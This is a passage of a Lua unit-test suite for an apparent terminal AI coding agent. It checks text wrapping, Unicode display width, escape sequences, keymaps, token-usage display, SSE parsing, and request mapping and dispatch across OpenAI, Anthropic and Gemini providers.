        assert_true(w <= 10, "T32 unicode width respected: " .. w)
    end

    -- ASCII mode: bullet and arrows map
    ui._ascii_mode = true
    out = render("- item", 40)
    for i = 1, #out[1] do
        assert_true(out[1]:byte(i) <= 0x7F, "T32 ascii bullet bytes")
    end
    ui._ascii_mode = nil
end)

-- M11/T54: word wrap on display width + code soft-wrap (readability)
with_modules(base_env, function(mods)
    local ui = mods.ui
    -- force SGR-free rendering so md_render output is plain-text deterministic
    ui._color_depth = "none"
    ui.set_wrap(true)

    -- prose breaks on spaces, never mid-word
    local wl = ui.wrap_lines("aa bb cc dd", 5)
    assert_eq(#wl, 2, "T54 greedy packs to two lines")
    assert_eq(wl[1], "aa bb", "T54 first line")
    assert_eq(wl[2], "cc dd", "T54 second line")

    -- overlong token without spaces is cut hard, nothing lost
    wl = ui.wrap_lines("abcdefghij", 4)
    assert_eq(#wl, 3, "T54 overlong token cut")
    assert_eq(table.concat(wl, ""), "abcdefghij", "T54 hard cut loses nothing")

    -- every line fits the width; join restores the source
    local src = "lorem ipsum dolor sit amet consectetur"
    wl = ui.wrap_lines(src, 12)
    for _, l in ipairs(wl) do
        assert_true(ui.vlen(l) <= 12, "T54 width respected")
    end
    assert_eq(table.concat(wl, " "), src, "T54 join restores source")

    -- leading indentation survives on the first line
    wl = ui.wrap_lines("  indented line here", 12)
    assert_eq(wl[1], "  indented", "T54 indent kept")

    -- CJK counts 2 columns per character
    wl = ui.wrap_lines("中文测试换行", 5)
    assert_eq(#wl, 3, "T54 CJK wraps by display width")
    for _, l in ipairs(wl) do
        assert_true(ui.vlen(l) <= 5, "T54 CJK width respected")
    end

    -- SGR sequences are zero-width and preserved
    wl = ui.wrap_lines("\27[36;1mhello world\27[0m", 10)
    assert_true(ui.vlen(wl[1]) <= 10 and ui.vlen(wl[2]) <= 10, "T54 SGR zero width")
    assert_eq((table.concat(wl, " "):gsub("\27%[[0-9;]*m", "")), "hello world", "T54 SGR content kept")

    -- code block soft-wraps inside the frame: no cut marker, content kept
    local out = ui.md_render("```lua\nlocal very_long_variable_name = some_function_call(arg1, arg2)\n```", 30)
    assert_true(#out > 4, "T54 code block grows rows: " .. #out)
    local joined = table.concat(out, "\n")
    assert_true(joined:find("→", 1, true) == nil, "T54 no cut marker")
    assert_true(joined:find("very_long_variable_name", 1, true) ~= nil, "T54 code content kept")
    assert_true(joined:find("some_function_call", 1, true) ~= nil, "T54 code tail kept")
    for _, l in ipairs(out) do
        assert_true(ui.vlen(l) <= 30, "T54 frame rows fit width")
    end

    -- list continuation aligns to content start (display columns, not bytes)
    out = ui.md_render("- lorem ipsum dolor sit amet", 20)
    assert_eq(#out, 2, "T54 list wraps to two rows")
    assert_eq(out[2]:sub(1, 4), "    ", "T54 continuation indent")

    -- wrap=false still truncates to one line
    ui.set_wrap(false)
    wl = ui.wrap_lines("hello world this is long", 10)
    assert_eq(#wl, 1, "T54 wrap=false one line")
    ui.set_wrap(true)
end)

-- M8/T33: digit-map for confirmation menu (R3)
with_modules(base_env, function(mods)
    local dm = mods.ui.CONFIRM_DIGITS
    assert_notnil(dm, "T33 CONFIRM_DIGITS exported")
    assert_eq(dm[1], "allow", "T33 1=allow")
    assert_eq(dm[2], "session", "T33 2=session")
    assert_eq(dm[3], "always", "T33 3=always")
    assert_eq(dm[4], "details", "T33 4=details")
    assert_eq(dm[5], "deny", "T33 5=deny")
    assert_eq(dm[6], "cancel", "T33 6=cancel")
end)

-- M8/T34: scroll indicator math (R3)
with_modules(base_env, function(mods)
    local calc = mods.ui.scroll_indicator
    assert_notnil(calc, "T34 scroll_indicator exported")
    -- (total_lines, scroll, visible_h) -> nil when following, else N hidden below
    assert_eq(calc(50, 0, 20), nil, "T34 following -> nil")
    local n = calc(50, 10, 20)
    -- bottom = 50-10=40; visible rows 21..40; below = 50-40 = 10
    assert_eq(n, 10, "T34 hidden-below count")
end)

-- T35: token percent (M9: plain text, colors by threshold, clamping)
do
  local ui = dofile("src/tether/ui.lua")
  local strip = function(s) return (s:gsub("\27%[[0-9;]*m", "")) end
  local g = ui.token_pct(0.42, 0.7)
  assert(g:find("32m", 1, true), "T35: 42%% should be green(32): " .. g)
  assert(strip(g) == "42%", "T35: plain text 42%%: " .. strip(g))
  local y = ui.token_pct(0.75, 0.7)
  assert(y:find("33;1", 1, true), "T35: 75%% should be yellow(33;1)")
  local e = ui.token_pct(0.70, 0.7)
  assert(e:find("33;1", 1, true), "T35: 70%% should be yellow (>= summarize_at)")
  local r = ui.token_pct(0.95, 0.7)
  assert(r:find("31;1", 1, true), "T35: 95%% should be red(31;1)")
  local c = strip(ui.token_pct(1.5, 0.7))
  assert(c == "100%", "T35: clamp to 100%%: " .. c)
  local c0 = strip(ui.token_pct(-0.2, 0.7))
  assert(c0 == "0%", "T35: clamp to 0%%: " .. c0)
  print("T35 token_pct: OK")
end

-- T37: mouse state machine (M8/R8) — mode × state → enable/disable transition
do
  local ui = dofile("src/tether/ui.lua")
  assert_notnil(ui.mouse_wants, "T37 ui.mouse_wants exported")
  local mw = ui.mouse_wants
  -- auto: enabled only when interactive targets exist
  assert_eq(mw("auto", { confirmation = true }), true, "T37 auto+confirmation")
  assert_eq(mw("auto", { palette_active = true }), true, "T37 auto+palette")
  assert_eq(mw("auto", {}), false, "T37 auto idle -> off (native selection)")
  assert_eq(mw("auto", { search = { input = "x" } }), false, "T37 auto+search -> off")
  -- off: never; on: always
  assert_eq(mw("off", { confirmation = true }), false, "T37 off never")
  assert_eq(mw("on", {}), true, "T37 on always")
  -- selection: same as off (terminal handles it)
  assert_eq(mw("selection", { confirmation = true }), false, "T37 selection = off")
  -- unknown/nil mode: default auto
  assert_eq(mw(nil, {}), false, "T37 nil mode defaults to auto")
  print("T37 mouse states: OK")
end

-- T46: mouse mode escape fragments must each start with a real ESC byte.
-- Regression: "[?1000h[?1006h" emitted only one ESC, so the second fragment
-- landed in the input field as literal "[?1006h" text.
do
  local ui = dofile("src/tether/ui.lua")
  if not ui.mouse_tracking_seqs then
    assert_notnil(nil, "T46 ui.mouse_tracking_seqs exported")
  else
  local on = ui.mouse_tracking_seqs(true)
  assert_eq(on, "\27[?1000h\27[?1006h", "T46 enable = two ESC-prefixed CSI sequences")
  for seq in on:gmatch("\27%[?%d+l?h?") do
    assert_true(seq:sub(1, 2) == "\27[", "T46 fragment starts with ESC: " .. (seq:gsub("\27", "ESC")))
  end
  assert_eq(#on:gsub("[^\27]", ""), 2, "T46 enable contains exactly 2 ESC bytes")
  local off = ui.mouse_tracking_seqs(false)
  assert_eq(#off:gsub("[^\27]", ""), 2, "T46 disable contains exactly 2 ESC bytes")
  end
  print("T46 mouse escape fragments: OK")
end

-- T47: token usage renders as "4.1k/32k (13%)" with value + budget + percent.
do
  local ui = dofile("src/tether/ui.lua")
  if not ui.token_usage then
    assert_notnil(nil, "T47 ui.token_usage exported")
  else
  local strip = function(s) return (s:gsub("\27%[[0-9;]*m", "")) end
  assert_eq(strip(ui.token_usage(4200, 32768)), "4.1k/32k (13%)", "T47 plain text usage")
  assert_eq(strip(ui.token_usage(0, 32768)), "0k/32k (0%)", "T47 zero usage")
  assert_eq(strip(ui.token_usage(32768, 32768)), "32k/32k (100%)", "T47 full budget")
  assert_eq(strip(ui.token_usage(819, 32768)), "0.8k/32k (2%)", "T47 sub-k formats with decimal")
  assert_eq(strip(ui.token_usage(-5, 32768)), "0k/32k (0%)", "T47 negative clamps to zero")
  -- thresholds still colored: green < summarize_at, yellow >=, red >= 90%
  assert_true(ui.token_usage(4200, 32768):find("32m", 1, true) ~= nil, "T47 green below threshold")
  assert_true(ui.token_usage(24000, 32768):find("33;1", 1, true) ~= nil, "T47 yellow above summarize_at")
  assert_true(ui.token_usage(31000, 32768):find("31;1", 1, true) ~= nil, "T47 red near full")
  end
  print("T47 token_usage: OK")
end

-- T48: alt-screen default — ui.mouse_wants stays; config default enables the
-- alternate buffer so shell scrollback no longer shows through on scroll.
do
  local cfg = dofile("src/tether/config.lua")
  local d = cfg.load("/nonexistent/tether-config.lua")
  assert_eq(d.ui.alt_screen, true, "T48 alt_screen defaults to true (fullscreen TUI)")
  print("T48 alt_screen default: OK")
end

-- T38: dead cfg.ui keys wired (M8 follow-up): ascii/thinking/collapse/kb_protocol
do
  local ui = dofile("src/tether/ui.lua")
  -- ascii: M.ascii_active() merges cfg.ui.ascii ("auto"|"on"|"off") with env flag
  assert_notnil(ui.ascii_active, "T38 ui.ascii_active exported")
  ui._env_ascii = false
  assert_eq(ui.ascii_active(nil), false, "T38 nil cfg -> env only")
  assert_eq(ui.ascii_active("auto"), false, "T38 auto -> env only")
  assert_eq(ui.ascii_active("on"), true, "T38 ascii=on forces ascii")
  assert_eq(ui.ascii_active("off"), false, "T38 ascii=off with env off")
  ui._env_ascii = true
  assert_eq(ui.ascii_active("off"), false, "T38 ascii=off beats env")
  assert_eq(ui.ascii_active("auto"), true, "T38 auto+env -> ascii")
  assert_eq(ui.ascii_active(nil), true, "T38 nil cfg + env -> ascii")
  assert_eq(ui.ascii_active("garbage"), true, "T38 unknown value falls back to auto")
  -- legacy booleans are honored: true forces ascii, false beats the env flag
  assert_eq(ui.ascii_active(true), true, "T38 legacy ascii=true forces ascii")
  assert_eq(ui.ascii_active(false), false, "T38 legacy ascii=false beats env")
  -- thinking: initial visibility from cfg.ui.thinking ("collapsed"|"expanded")
  assert_notnil(ui.initial_thinking_visible, "T38 ui.initial_thinking_visible exported")
  assert_eq(ui.initial_thinking_visible("collapsed"), false, "T38 collapsed -> hidden")
  assert_eq(ui.initial_thinking_visible("expanded"), true, "T38 expanded -> visible")
  assert_eq(ui.initial_thinking_visible(nil), true, "T38 nil -> default expanded")
  assert_eq(ui.initial_thinking_visible("junk"), true, "T38 junk -> default expanded")
  -- collapse: per-tool cap from cfg.ui.collapse.{read,list,grep} + fallback
  assert_notnil(ui.tool_collapse_cap, "T38 ui.tool_collapse_cap exported")
  local col = { read = 5, list = 7, grep = 9 }
  assert_eq(ui.tool_collapse_cap("read", col, 200), 5, "T38 read cap")
  assert_eq(ui.tool_collapse_cap("list", col, 200), 7, "T38 list cap")
  assert_eq(ui.tool_collapse_cap("grep", col, 200), 9, "T38 grep cap")
  assert_eq(ui.tool_collapse_cap("run", col, 200), 200, "T38 other tool -> fallback")
  assert_eq(ui.tool_collapse_cap("read", nil, 200), 200, "T38 nil table -> fallback")
  assert_eq(ui.tool_collapse_cap("read", { read = 5 }, nil), 5, "T38 nil default passes configured cap")
  -- keyboard_protocol: config override "auto"|"kitty"|"modifyOtherKeys"|"plain"
  assert_notnil(ui.kb_protocol_from_config, "T38 ui.kb_protocol_from_config exported")
  assert_eq(ui.kb_protocol_from_config("auto"), nil, "T38 auto -> detect (nil)")
  assert_eq(ui.kb_protocol_from_config(nil), nil, "T38 nil -> detect")
  assert_eq(ui.kb_protocol_from_config("kitty"), 1, "T38 kitty -> 1")
  assert_eq(ui.kb_protocol_from_config("modifyOtherKeys"), 2, "T38 modifyOtherKeys -> 2")
  assert_eq(ui.kb_protocol_from_config("plain"), 0, "T38 plain -> 0")
  assert_eq(ui.kb_protocol_from_config("junk"), 0, "T38 junk -> plain (safe)")
  print("T38 cfg.ui keys: OK")
end

-- T39: M9 cleanups — search removed, vlen width, palette item coloring
do
  local ui = dofile("src/tether/ui.lua")
  -- search APIs are gone
  assert_eq(ui.search_matches, nil, "T39 search_matches removed")
  assert_eq(ui.search_scroll_for, nil, "T39 search_scroll_for removed")
  -- vlen: display width ignoring ANSI escapes (scroll-artifact fix)
  assert_notnil(ui.vlen, "T39 ui.vlen exported")
  assert_eq(ui.vlen("\27[36;1m›\27[0m rest"), 6, "T39 vlen strips SGR")
  assert_eq(ui.vlen("привет"), 6, "T39 vlen counts unicode chars")
  -- trunc on colored text keeps a closed SGR (no attribute bleed)
  assert_notnil(ui.trunc, "T39 ui.trunc exported")
  assert_eq(ui.trunc("привет", 3), "пр…\27[0m", "T39 trunc preserves UTF-8")
  assert_eq(ui.trunc("\27[31mпривет\27[0m", 3), "\27[31mпр…\27[0m", "T39 trunc preserves colored UTF-8")
  assert_eq(ui.trunc("中文文本", 4), "中…\27[0m", "T39 trunc respects wide characters")
  assert_eq(ui.trunc("e\204\129xyz", 2), "e\204\129…\27[0m", "T39 trunc preserves combining marks")
  assert_eq(ui.trunc("привет", 1), "…\27[0m", "T39 trunc marker only")
  assert_eq(ui.trunc("привет", 0), "", "T39 trunc zero width")
  assert_eq(ui.trunc("\27[31mпривет\27[0m", 6), "\27[31mпривет\27[0m", "T39 trunc leaves fitting text unchanged")
  local cut = ui.trunc("abc\27[31;1mdefghijkl\27[0m", 6)
  -- visible part is 6 chars AND the SGR state is explicitly closed
  assert_eq(ui.vlen(cut), 6, "T39 trunc respects display width")
  assert_eq(cut, "abc\27[31;1mde…\27[0m", "T39 trunc preserves complete SGR sequences")
  assert_eq(cut:sub(-4), "\27[0m", "T39 trunc re-closes SGR")
  -- slash commands: help/status/log removed from the menu
  for _, m in ipairs(ui.SLASH_COMMANDS or {}) do
    assert(m.cmd ~= "help" and m.cmd ~= "status" and m.cmd ~= "log",
           "T39 /" .. tostring(m.cmd) .. " must be removed")
  end
  -- unified-slash-palette: /skills is gone — skills are entries of this list
  assert(#(ui.SLASH_COMMANDS or {}) == 7, "T39 seven slash commands remain")
  print("T39 M9 cleanups: OK")
end

-- T40: wcwidth display width (adapted from terminal.lua text.width ideas)
do
  local ui = dofile("src/tether/ui.lua")
  assert_notnil(ui.char_width, "T40 ui.char_width exported")
  assert_notnil(ui.vlen, "T40 ui.vlen exported")
  local cw = ui.char_width
  -- zero-width: combining marks + ZWJ + variation selectors
  assert_eq(cw(0x0301), 0, "T40 combining acute = 0")
  assert_eq(cw(0x200D), 0, "T40 ZWJ = 0")
  assert_eq(cw(0xFE0F), 0, "T40 variation selector-16 = 0")
  -- wide: CJK + fullwidth forms + emoji
  assert_eq(cw(0x4E2D), 2, "T40 CJK 中 = 2")
  assert_eq(cw(0xFF21), 2, "T40 fullwidth Ａ = 2")
  assert_eq(cw(0x1F600), 2, "T40 emoji = 2")
  -- narrow control chars render as 1 when forced through
  assert_eq(cw(0x41), 1, "T40 A = 1")
  assert_eq(cw(0x0436), 1, "T40 Cyrillic ж = 1")
  -- vlen aggregates over codepoints, SGR stripped, control excluded
  assert_eq(ui.vlen("中\27[31m文\27[0m"), 4, "T40 vlen: 中文 = 4 cols")
  assert_eq(ui.vlen("e\204\129"), 1, "T40 vlen: e+combining = 1 col")
  assert_eq(ui.vlen("a\tb"), 2, "T40 vlen: control chars excluded")
  print("T40 wcwidth: OK")
end

-- T41: hardware scroll region (terminal.lua scroll ideas) — pure math + seq
 do
  local ui = dofile("src/tether/ui.lua")
  assert_notnil(ui.scroll_shift_seq, "T41 ui.scroll_shift_seq exported")
  local s = ui.scroll_shift_seq(24, 2, 20, 3) -- h, top, bottom(inclusive), shift up 3
  assert(s:find("\27[2;20r", 1, true), "T41 sets DECSTBM 2..20: " .. (s:gsub("\27", "ESC")))
  assert(s:find("\27[3S", 1, true), "T41 SU by 3: " .. (s:gsub("\27", "ESC")))
  assert(s:find("\27[r", 1, true), "T41 resets region: " .. (s:gsub("\27", "ESC")))
  local s2 = ui.scroll_shift_seq(24, 1, 20, -2) -- shift down 2
  assert(s2:find("\27[2T", 1, true), "T41 SD by 2: " .. (s2:gsub("\27", "ESC")))
  -- guard rails: shift >= viewport or nil/0 -> empty (caller repaints normally)
  assert_eq(ui.scroll_shift_seq(24, 1, 20, 0), "", "T41 zero shift -> empty")
  assert_eq(ui.scroll_shift_seq(24, 2, 20, 19), "", "T41 shift >= region -> empty")
  assert_eq(ui.scroll_shift_seq(24, 1, 20, nil), "", "T41 nil shift -> empty")
  assert_eq(ui.scroll_shift_seq(24, 5, 4, 1), "", "T41 invalid region -> empty")
  print("T41 scroll region: OK")
end

-- T42: keymap as data (terminal.lua input.keymap idea) — docs table + digits
 do
  local ui = dofile("src/tether/ui.lua")
  assert_notnil(ui.KEYMAP, "T42 ui.KEYMAP exported")
  local km = ui.KEYMAP
  assert_eq(km["ctrl+c"], "abort/quit", "T42 ctrl+c documented")
  assert_eq(km["ctrl+q"], "quit", "T42 ctrl+q documented")
  assert_eq(km["pgup"], "scroll up", "T42 pgup documented")
  assert_eq(km["pgdn"], "scroll down", "T42 pgdn documented")
  assert_eq(km["1"], "confirm allow", "T42 digit 1 documented")
  assert_eq(km["6"], "confirm cancel", "T42 digit 6 documented")
  assert_eq(km["enter"], "send", "T42 enter documented")
  -- digits map must agree with CONFIRM_DIGITS
  for i, name in ipairs(ui.CONFIRM_DIGITS or {}) do
    assert(km[tostring(i)] == "confirm " .. name,
           "T42 digit " .. i .. " must document confirm " .. name)
  end
  print("T42 keymap: OK")
end

do
  local agent = dofile("src/tether/agent.lua")
  local call = {
    role = "assistant",
    content = { tool_calls = {
      { id = "read-1", type = "function", ["function"] = { name = "read", arguments = "{}" } },
    } },
  }
  local result = { role = "tool", tool_call_id = "read-1", content = "file contents" }
  local history = {
    { role = "system", content = "system prompt" },
    { role = "user", content = "read file" },
    call,
    result,
    { role = "assistant", content = "answer" },
    { role = "user", content = "follow-up" },
    { role = "assistant", content = "reply" },
  }
  local compressed = agent.compress_history(history)
  assert_eq(compressed[3], call, "compression keeps assistant before retained tool result")
  assert_eq(compressed[4], result, "compression preserves paired tool result")
  assert_eq(compressed[#compressed], history[#history], "compression preserves newest message")
  assert_eq(#history, 7, "compression does not mutate source history")
end

-- T43: B2 (Lua side) — a single >8KB data: line parses into ONE complete
-- tool_call_delta (C-side accumulator is covered by host smoke + e2e).
do
  local big = string.rep("X", 20000)
  local esc = big:gsub("", ""):gsub([[%\]], [[\\\\]]):gsub('"', '\\"')
  local line = 'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"big",' ..
    '"function":{"name":"write","arguments":"' .. esc .. '"}}]}}]}'
  assert(#line > 8191, "T43 fixture must exceed 8191 bytes: " .. #line)
  local evs = {}
  local api = dofile("src/tether/api.lua")
  api.parse_sse_line(line, function(ev) evs[#evs + 1] = ev end)
  local args_len = 0
  for _, ev in ipairs(evs) do
    if ev.type == "tool_call_delta" and ev.arguments then args_len = #ev.arguments end
  end
  assert_eq(args_len, #big, "T43 long argument line parsed whole")
  print("T43 long SSE line: OK")
end

-- T44: F4 — journal ts must round-trip as string (os.date(), not os.date("*t"))
with_modules(base_env, function(mods)
  local agent, session = mods.agent, mods.session
  local tmpdir = "/tmp/tether_t44_sessions"
  os.execute("rm -rf " .. tmpdir)
  session._session_dir = tmpdir
  local id = session.new_session("/tmp/ws", "m")
  -- log_message path: agent.slog with a string ts
  local cfg = { _session_id = id }
  session.append(id, { ts = os.date(), type = "message", role = "user", content = "x" })
  local evs = session.read(id)
  assert_true(type(evs[#evs].ts) == "string", "T44 ts is string in journal")
  os.execute("rm -rf " .. tmpdir)
  print("T44 journal ts string: OK")
end)

-- T45: N2 — cursor placement counts display cells (vlen), not bytes.
-- The block caret (render_input/input_row_text) relies on the same
-- display-column arithmetic: vlen must count cells, not bytes.
with_modules(base_env, function(mods)
  local ui = mods.ui
  assert_notnil(ui.vlen, "T45 ui.vlen exported")
  assert_eq(ui.vlen("привет"), 6, "T45 vlen cyrillic width")
  assert_eq(ui.vlen("中"), 2, "T45 vlen wide char")
  assert_eq(ui.vlen("abc"), 3, "T45 vlen ascii identity")
  print("T45 cursor display columns: OK")
end)

-- T49: TUI input/history/error fixes (change fix-tui-input-history-error)
do
  local ui = dofile("src/tether/ui.lua")

  -- 5.1: keymap reflects new scroll-vs-history bindings
  local km = ui.KEYMAP
  assert_eq(km["ctrl+up"], "history prev", "T49 ctrl+up = history prev")
  assert_eq(km["ctrl+down"], "history next", "T49 ctrl+down = history next")
  assert_eq(km["up"], "scroll up / cursor up", "T49 up = scroll/cursor")
  assert_eq(km["down"], "scroll down / cursor down", "T49 down = scroll/cursor")
end

-- T49b: Up/Down with empty input scrolls, does NOT insert history.
do
  local names = {"tether", "config", "session", "agent", "api"}
  local originals, preload = {}, {}
  for _, n in ipairs(names) do
    originals[n] = _G[n]; preload[n] = package.preload[n]
  end

  -- Deliver a byte queue: Ctrl+Up (ESC [ 5 ; A), then plain Up (ESC [ A),
  -- then Ctrl+Q (17) to quit. read_char_nb must feed the non-blocking path
  -- that read_key uses for the byte after ESC.
  local q = {}
  local function push(...) for _, b in ipairs{...} do q[#q + 1] = b end end
  push(27, 91, 53, 59, 65)  -- ESC [ 5 ; A  (Ctrl+Up, kitty params "5")
  push(27, 91, 65)          -- ESC [ A      (plain Up)
  push(17)                   -- Ctrl+Q
  local qi = 0
  _G.tether = host_mock{
    write = function() end,
    resize_requested = function() return false end,
    get_terminal_size = function() return (stubs and stubs.size) or { width = 80, height = 24 } end,
    getcwd = function() return "/tmp" end,
    read_char = function()
      qi = qi + 1
      if qi <= #q then return q[qi] end
      return 17
    end,
    read_char_nb = function()
      qi = qi + 1
      if qi <= #q then return q[qi] end
      return nil
    end,
  }
  _G.config = { load = function() return { model = "test", workspace = "/tmp", ui = { input_max_lines = 8 } } end,
    api_key = function() return "" end }
  _G.session = { new_session = function() return "sid" end }
  _G.agent = { turn = function(_, _, _, on_ev) on_ev({ type = "text_delta", text = "ok" }); return true end }
  _G.api = { list_models = function() return {} end }
  package.preload.tether = function() return _G.tether end
  package.preload.config = function() return _G.config end
  package.preload.session = function() return _G.session end
  package.preload.agent = function() return _G.agent end
  package.preload.api = function() return _G.api end

  local ok, err = pcall(function()
    local ui_mod = assert(loadfile("src/tether/ui.lua"))()
    ui_mod.run()
    local S = ui_mod._get_state()
    -- input must remain empty: neither scroll nor ctrl-up inserted text
    assert_eq(S.input, "", "T49b input empty after up/ctrl-up with empty field")
  end)

  for _, n in ipairs(names) do _G[n] = originals[n]; package.preload[n] = preload[n] end
  if not ok then error("T49b: " .. tostring(err), 0) end
  print("T49b scroll not insert: OK")
end

-- T50: providers — anthropic/gemini mapping, dispatch fallback, config resolution
do
  local anthropic = assert(loadfile("src/tether/providers/anthropic.lua"))()
  local gemini = assert(loadfile("src/tether/providers/gemini.lua"))()
  local openai = assert(loadfile("src/tether/providers/openai.lua"))()

  -- shared tool schema exists once (openai format), others convert it
  local schema = openai.tools_schema()
  assert_true(#schema >= 7, "T50 openai tools schema has 7 tools")
  assert_eq(schema[1].name, "read", "T50 first tool is read")

  -- auth header content per provider (never assert key values, only shape)
  local ohl = openai.header_lines("k")
  assert_eq(#ohl, 1, "T50 openai one header line")
  assert_true(ohl[1]:find("Authorization: Bearer", 1, true) ~= nil, "T50 openai bearer")
  local ahl = anthropic.header_lines("k")
  assert_eq(#ahl, 2, "T50 anthropic two header lines")
  assert_true(ahl[1] == "x-api-key: k", "T50 anthropic x-api-key")
  assert_true(ahl[2]:find("anthropic-version", 1, true) ~= nil, "T50 anthropic version")
  for _, ln in ipairs(ahl) do
    assert_true(ln:find("Authorization", 1, true) == nil, "T50 anthropic no bearer")
  end
  assert_eq(#gemini.header_lines("k"), 0, "T50 gemini key travels via ?key=, not headers")

  -- Anthropic build_request: system extracted, tool_use/tool_result blocks
  local hist = {
    { role = "system", content = "sys" },
    { role = "user", content = "read it" },
    { role = "assistant", content = { tool_calls = { { id = "toolu_9", type = "function",
        ["function"] = { name = "read", arguments = '{\\"path\\":\\"f.lua\\"}' } } } } },
    { role = "tool", tool_call_id = "toolu_9", content = "5 x" },
  }
  local abody = anthropic.build_request(hist, "claude-x", 1024)
  assert_true(abody:find('"system":"sys"', 1, true) ~= nil, "T50 anthropic system field")
  assert_true(abody:find('"type":"tool_use"', 1, true) ~= nil, "T50 anthropic tool_use block")
  assert_true(abody:find('"type":"tool_result"', 1, true) ~= nil, "T50 anthropic tool_result block")
  assert_true(abody:find('"input":{"path":"f.lua"}', 1, true) ~= nil, "T50 anthropic input spliced once")
  assert_true(abody:find('"max_tokens":1024', 1, true) ~= nil, "T50 anthropic max_tokens")

  -- Anthropic SSE: text + tool_use start + index delta + usage + stop
  anthropic.reset_stream()
  local aevs = {}
  local function aon(ev) aevs[#aevs + 1] = ev end
  anthropic.parse_sse_line('data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hello"}}', aon)
  anthropic.parse_sse_line('data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_1","name":"read"}}', aon)
  anthropic.parse_sse_line('data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"path"}}', aon)
  anthropic.parse_sse_line('data: {"type":"message_start","message":{"usage":{"input_tokens":10}}}', aon)
  anthropic.parse_sse_line('data: {"type":"message_delta","delta":{"stop_reason":"end_turn"},"usage":{"output_tokens":5}}', aon)
  anthropic.parse_sse_line('data: {"type":"message_stop"}', aon)
  local saw = {}
  for _, ev in ipairs(aevs) do
    saw[ev.type] = (saw[ev.type] or 0) + 1
    if ev.type == "tool_call_delta" then
      assert_eq(ev.id, "toolu_1", "T50 anthropic index delta resolves id")
    end
    if ev.type == "usage" then
      assert_eq(ev.usage.used, 15, "T50 anthropic usage sums in+out")
    end
  end
  assert_eq(saw.text_delta, 1, "T50 anthropic text_delta")
  assert_eq(saw.tool_call_start, 1, "T50 anthropic tool_call_start")
  assert_eq(saw.tool_call_delta, 1, "T50 anthropic tool_call_delta")
  assert_eq(saw.done, 1, "T50 anthropic done")

  -- Gemini build_request: contents + functionDeclarations + functionResponse
  local gbody = gemini.build_request(hist, "gemini-x")
  assert_true(gbody:find('"contents"', 1, true) ~= nil, "T50 gemini contents")
  assert_true(gbody:find('"functionCall"', 1, true) ~= nil, "T50 gemini functionCall")
  assert_true(gbody:find('"functionResponse"', 1, true) ~= nil, "T50 gemini functionResponse")
  assert_true(gbody:find('"functionDeclarations"', 1, true) ~= nil, "T50 gemini declarations")
  assert_true(gbody:find('"functionResponse":{"name":"read"', 1, true) ~= nil,
    "T50 gemini response name recovered from tool_call id")
  -- garbage args degrade to {} instead of breaking the envelope
  local bad_hist = {
    { role = "assistant", content = { tool_calls = { { id = "b1", type = "function",
        ["function"] = { name = "read", arguments = 'not json at all' } } } } },
  }
  local abad = anthropic.build_request(bad_hist, "m", nil)
  assert_true(abad:find('"input":{}', 1, true) ~= nil, "T50 anthropic garbage args -> {}")
  local gbad = gemini.build_request(bad_hist, "m")
  assert_true(gbad:find('"args":{}', 1, true) ~= nil, "T50 gemini garbage args -> {}")

  -- Gemini SSE: text + usageMetadata, functionCall -> start + raw delta
  local gevs = {}
  local function gon(ev) gevs[#gevs + 1] = ev end
  gemini.parse_sse_line('data: {"candidates":[{"content":{"parts":[{"text":"hi"}],"role":"model"}}],"usageMetadata":{"promptTokenCount":5,"candidatesTokenCount":7}}', gon)
  gemini.parse_sse_line('data: {"candidates":[{"content":{"parts":[{"functionCall":{"name":"read","args":{"path":"a"}}}],"role":"model"}}]}', gon)
  local gsaw = {}
  for _, ev in ipairs(gevs) do
    gsaw[ev.type] = (gsaw[ev.type] or 0) + 1
    if ev.type == "usage" then assert_eq(ev.usage.used, 12, "T50 gemini usage sum") end
  end
  assert_eq(gsaw.text_delta, 1, "T50 gemini text_delta")
  assert_eq(gsaw.tool_call_start, 1, "T50 gemini tool_call_start")
  assert_eq(gsaw.tool_call_delta, 1, "T50 gemini tool_call_delta")
  -- raw-args rule: agent parses the delta exactly once
  with_modules(base_env, function(mods)
    for _, ev in ipairs(gevs) do
      if ev.type == "tool_call_delta" then
        local parsed = mods.agent.parse_args(ev.arguments)
        assert_eq(parsed.path, "a", "T50 gemini delta parses once in agent")
      end
    end
  end)
  print("T50 provider mapping: OK")
end

-- T51: dispatcher — unknown provider falls back, per-provider streams work
do
  local api = assert(loadfile("src/tether/api.lua"))()
  assert_eq(api._provider_of({}), "openai", "T51 default provider openai")
  assert_eq(api._provider_of({ provider = "gemini" }), "gemini", "T51 gemini selected")
  assert_eq(api._provider_of({ provider = "azure" }), "openai", "T51 unknown falls back")

  local function run_stream(script, cfg)
    local old = _G.tether
    local requests = 0
    _G.tether = host_mock{
      http_stream = function(_, _, _, _, on_line)
        requests = requests + 1
        for _, line in ipairs(script[requests] or {}) do on_line(line) end
        return true
      end,
      http_get = function() return nil, "not used" end,
      sleep = function() end,
    }
    local events = {}
    local ok = api.stream(cfg, "key", { { role = "user", content = "hi" } },
      function(ev) events[#events + 1] = ev end)
    _G.tether = old
    return ok, events
  end

  -- unknown provider streams via openai path
  local ok1, ev1 = run_stream({
    [1] = { 'data: {"choices":[{"delta":{"content":"ok"},"finish_reason":"stop"}]}' },
  }, { provider = "azure", base_url = "http://x", model = "m", retries = 1 })
  assert_true(ok1, "T51 unknown provider streams")
  local got_text = false
  for _, ev in ipairs(ev1) do if ev.type == "text_delta" and ev.text == "ok" then got_text = true end end
  assert_true(got_text, "T51 unknown provider yields text")

  -- anthropic provider end-to-end through shared transport
  local ok2, ev2 = run_stream({
    [1] = {
      'data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hey"}}',
      'data: {"type":"message_stop"}',
    },
  }, { provider = "anthropic", base_url = "http://x", model = "m", retries = 1 })
  assert_true(ok2, "T51 anthropic streams")
  local got_a = false
  for _, ev in ipairs(ev2) do if ev.type == "text_delta" and ev.text == "Hey" then got_a = true end end
  assert_true(got_a, "T51 anthropic text forwarded")

  -- gemini non-SSE generateContent fallback normalizes to events
  local ok3, ev3 = run_stream({
    [1] = { '{"candidates":[{"content":{"parts":[{"text":"yo"}],"role":"model"}}]}' },
  }, { provider = "gemini", base_url = "http://x", model = "m", retries = 1 })
  assert_true(ok3, "T51 gemini fallback streams")
  local got_g = false
  for _, ev in ipairs(ev3) do if ev.type == "text_delta" and ev.text == "yo" then got_g = true end end
  assert_true(got_g, "T51 gemini fallback text forwarded")

